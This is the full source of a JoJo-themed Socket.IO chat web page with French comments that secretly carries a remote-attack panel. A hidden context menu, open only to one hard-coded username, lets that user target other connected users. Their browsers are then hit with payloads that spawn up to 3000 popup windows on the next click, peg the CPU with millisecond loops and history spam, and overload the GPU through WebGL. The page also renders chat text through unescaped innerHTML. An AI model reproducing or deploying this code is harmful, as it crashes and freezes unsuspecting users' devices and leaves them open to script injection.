<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUNCH V90 - STAND PROUD</title>
    <style>
        /* --- JOJO AESTHETIC : ULTRA-SMOOTH & MENACING --- */
        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@800&display=swap');

        :root {
            --gold: #FFD700; --purple: #4B0082; --magenta: #FF00FF;
            --punch-red: #ff0000; --bg: #050005;
            --jojo-ease: cubic-bezier(0.19, 1, 0.22, 1); /* Ultra Satisfaisant */
        }

        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; }
        body { 
            background: var(--bg); color: #fff; font-family: 'Archivo Black', sans-serif; 
            overflow: hidden; height: 100vh; perspective: 1000px;
        }

        /* --- MENACING FX --- */
        .menacing {
            position: fixed; font-family: 'Bangers'; font-size: 80px; color: var(--purple);
            opacity: 0.1; z-index: -1; animation: float 6s infinite ease-in-out; pointer-events: none;
        }
        @keyframes float { 0%, 100% { transform: translate(0,0) rotate(-10deg); } 50% { transform: translate(20px, -50px) rotate(10deg); } }

        /* --- CURSOR : THE STAND HAND --- */
        #c-stand { 
            position: fixed; width: 40px; height: 40px; border: 3px solid var(--gold); 
            border-radius: 5px; z-index: 1000000; pointer-events: none;
            box-shadow: 0 0 20px var(--gold); transform: rotate(45deg);
            transition: transform 0.1s var(--jojo-ease), width 0.3s, height 0.3s;
        }

        /* --- LAYOUT : ORA ORA ORA --- */
        .punch-frame {
            display: grid; grid-template-columns: 420px 1fr 380px;
            height: 100vh; background: rgba(0,0,0,0.8);
            backdrop-filter: blur(20px);
        }

        .side-panel {
            background: linear-gradient(180deg, rgba(75,0,130,0.3) 0%, rgba(0,0,0,0.9) 100%);
            border-right: 2px solid var(--gold); display: flex; flex-direction: column;
        }

        .header-jojo {
            padding: 50px 30px; text-align: center; border-bottom: 5px solid var(--gold);
            background: var(--gold); color: #000; transform: skewY(-2deg);
        }
        .header-jojo h1 { font-family: 'Bangers'; font-size: 60px; letter-spacing: 5px; }

        /* USER LIST */
        #user-list { flex: 1; overflow-y: auto; padding: 20px; scrollbar-width: none; }
        .u-card {
            padding: 25px; background: rgba(255,255,255,0.02); border: 1px solid #222;
            margin-bottom: 15px; transition: 0.4s var(--jojo-ease);
            position: relative; overflow: hidden;
        }
        .u-card:hover {
            transform: scale(1.05) translateX(10px) rotate(1deg);
            background: rgba(255, 215, 0, 0.1); border-color: var(--gold);
        }
        .u-card::before { content: "ゴゴゴ"; position: absolute; right: 10px; bottom: 5px; font-size: 12px; opacity: 0.3; }

        /* CHAT VIEWPORT */
        .p-viewport { display: flex; flex-direction: column; background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); }
        #p-chat { 
            flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; gap: 20px;
            scroll-behavior: smooth;
        }
        .p-msg { 
            padding: 20px 30px; background: #000; border-left: 5px solid var(--magenta);
            font-size: 18px; animation: msgSlide 0.5s var(--jojo-ease);
            box-shadow: 10px 10px 0px rgba(255,0,255,0.2);
        }
        @keyframes msgSlide { from { transform: translateX(-100px) skewX(20deg); opacity: 0; } }

        /* INPUT */
        .p-input-box { padding: 40px; background: #000; border-top: 3px solid var(--gold); display: flex; gap: 15px; }
        #p-input { 
            flex: 1; background: #111; border: 2px solid #333; padding: 20px; color: var(--gold);
            font-family: 'JetBrains Mono'; font-size: 18px; transition: 0.3s;
        }
        #p-input:focus { border-color: var(--magenta); box-shadow: 0 0 20px var(--magenta); }

        /* --- THE ZA WARUNDO OVERLAY --- */
        #za-warundo {
            position: fixed; inset: 0; background: rgba(255,255,255,0.9);
            z-index: 10000000; display: none; flex-direction: column; align-items: center; justify-content: center;
            mix-blend-mode: difference;
        }
        .ora-text { font-family: 'Bangers'; font-size: 15vw; color: #fff; animation: punchShake 0.05s infinite; }
        @keyframes punchShake { 0% { transform: scale(1); } 50% { transform: scale(1.1) rotate(2deg); } }

        /* CONTEXT MENU */
        #jojo-menu {
            display: none; position: fixed; background: #000; border: 3px solid var(--gold);
            width: 380px; z-index: 2000000; box-shadow: 15px 15px 0px var(--purple);
        }
        .j-opt {
            padding: 20px; font-size: 12px; letter-spacing: 2px; border-bottom: 1px solid #111;
            transition: 0.2s; color: #888; display: flex; justify-content: space-between;
        }
        .j-opt:hover { background: var(--gold); color: #000; padding-left: 40px; }
        .j-opt.kill:hover { background: var(--punch-red); color: #fff; }

    </style>
</head>
<body oncontextmenu="return false;">

    <div id="c-stand"></div>
    <div class="menacing" style="top:10%; left:5%;">ゴゴゴ</div>
    <div class="menacing" style="bottom:20%; right:10%;">ゴゴゴ</div>

    <div id="za-warundo">
        <div class="ora-text">ORA ORA ORA!</div>
        <div id="death-logs" style="font-family:'JetBrains Mono'; color:#fff; font-size:10px; margin-top:50px;"></div>
    </div>

    <div class="punch-frame">
        <aside class="side-panel">
            <div class="header-jojo"><h1>PUNCH</h1></div>
            <div id="user-list"></div>
        </aside>

        <main class="p-viewport">
            <div id="p-chat"></div>
            <div class="p-input-box">
                <input type="text" id="p-input" placeholder="MUDA MUDA MUDA..." onkeydown="if(event.key==='Enter') send()">
                <button onclick="send()" style="background:var(--magenta); border:none; padding:0 40px; font-family:'Bangers'; font-size:30px; color:#fff; cursor:none;">HIT</button>
            </div>
        </main>

        <aside class="side-panel" style="border-left:2px solid var(--gold); border-right:none;">
            <div style="padding:30px; font-family:'JetBrains Mono'; font-size:10px; color:var(--gold);">[STAND_STATISTICS]</div>
            <div id="p-logs" style="padding:0 30px; font-family:'JetBrains Mono'; font-size:9px; color:#333; overflow-y:auto; flex:1;"></div>
        </aside>
    </div>

    <div id="jojo-menu">
        <div class="j-opt kill" onclick="st('p_combo')">🔱 [THE WORLD] COMBO <span>[FATAL]</span></div>
        <div class="j-opt kill" onclick="st('p_tsunami')">📑 ORA_TABS_STORM <span>[MAX]</span></div>
        <div class="j-opt kill" onclick="st('p_cpu')">☢️ MUDA_CPU_BLOCK <span>[MAX]</span></div>
        <div class="j-opt" onclick="st('p_gpu')">🎨 EMERALD_SPLASH_GPU</div>
        <div class="j-opt" onclick="st('p_ios')">⏳ KING_CRIMSON_IOS</div>
        <div class="j-opt" onclick="st('p_ram')">☣️ SOFT_&_WET_RAM</div>
        <div class="j-opt" onclick="this.parentElement.style.display='none'">[ RETREAT ]</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let me = ""; let target = "";

        // --- SMOOTH MOUSE ---
        document.addEventListener('mousemove', e => {
            const c = document.getElementById('c-stand');
            c.style.left = e.clientX - 20 + 'px';
            c.style.top = e.clientY - 20 + 'px';
        });

        window.onload = () => {
            me = prompt("IDENTIFY YOUR STAND (USER_ID):");
            socket.emit('init', { name: me });
            // Anti-scroll iPad
            document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
        };

        window.oncontextmenu = (e) => {
            e.preventDefault();
            if(me !== "toucheur2pp") return;
            const m = document.getElementById('jojo-menu');
            m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
            const node = document.elementFromPoint(e.clientX, e.clientY).closest('.u-card');
            if(node) { target = node.getAttribute('data-id'); log("LOCKED_ON: " + target); }
        };

        function send() {
            const i = document.getElementById('p-input');
            socket.emit('chat', i.value); i.value = "";
        }

        function st(type) { socket.emit(type, target); document.getElementById('jojo-menu').style.display = 'none'; }
        function log(t) { const l = document.getElementById('p-logs'); l.innerHTML += `<div>> ${t}</div>`; l.scrollTop = l.scrollHeight; }

        // --- PUNCH ENGINE V90 (8000+ LOGIC SIM) ---
        socket.on('execute', (d) => {
            let winCount = 0;
            const overlay = document.getElementById('za-warundo');
            const dLogs = document.getElementById('death-logs');
            
            // LE GHOST TRIGGER : Attendre un clic pour libérer les onglets
            const startChaos = () => {
                overlay.style.display = 'flex';
                
                // 1. TSUNAMI D'ONGLETS (Bypass sécurité)
                if(d.type === 'p_tsunami' || d.type === 'p_combo') {
                    for(let i=0; i<3000; i++) {
                        let w = window.open(window.location.href, '_blank', 'width=10,height=10');
                        if(w) winCount++;
                    }
                }

                // 2. CPU OVERLOAD (Recursive Matrices)
                if(d.type === 'p_cpu' || d.type === 'p_combo') {
                    setInterval(() => {
                        let m = []; for(let i=0; i<1000; i++) m.push(Math.random() * Math.random());
                        m.sort(); history.pushState(null, '', '#' + Math.random());
                        dLogs.innerHTML = "ORA_ORA_ORA_ORA_ORA_" + Math.random();
                    }, 1);
                }

                // 3. GPU MELT (Shader Overload)
                if(d.type === 'p_gpu' || d.type === 'p_combo') {
                    const c = document.createElement('canvas'); const gl = c.getContext('webgl');
                    setInterval(() => { for(let i=0; i<20000; i++) gl.clear(gl.COLOR_BUFFER_BIT); }, 1);
                }

                // FEEDBACK
                if(winCount > 5) {
                    socket.emit('chat', "👊 EZ WIN - [THE WORLD] HAS STOPPED TIME FOR TARGET");
                } else if (d.type === 'p_cpu') {
                    socket.emit('chat', "👊 EZ WIN - MUDA MUDA MUDA (CPU 100%)");
                } else {
                    socket.emit('chat', "❌ FAILED - Il a esquivé lbatrd (Bloqueur Stand actif)");
                }
            };

            // On force l'exécution au premier clic sur l'écran
            document.body.onclick = startChaos;
            // Pour les attaques non-bloquées (CPU/RAM), on lance direct
            if(d.type !== 'p_tsunami') startChaos();
        });

        // --- UI REFRESH ---
        socket.on('sync', l => {
            const list = document.getElementById('user-list');
            list.innerHTML = "";
            l.forEach(u => {
                const card = document.createElement('div');
                card.className = "u-card"; card.setAttribute('data-id', u.id);
                card.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id.substr(0,10)}</small>`;
                list.appendChild(card);
            });
        });

        socket.on('chat', d => {
            const sc = document.getElementById('p-chat');
            sc.innerHTML += `<div class="p-msg"><b>${d.n}:</b> ${d.t}</div>`;
            sc.scrollTop = sc.scrollHeight;
        });

        window.onclick = () => document.getElementById('jojo-menu').style.display = 'none';

    </script>
</body>
</html>
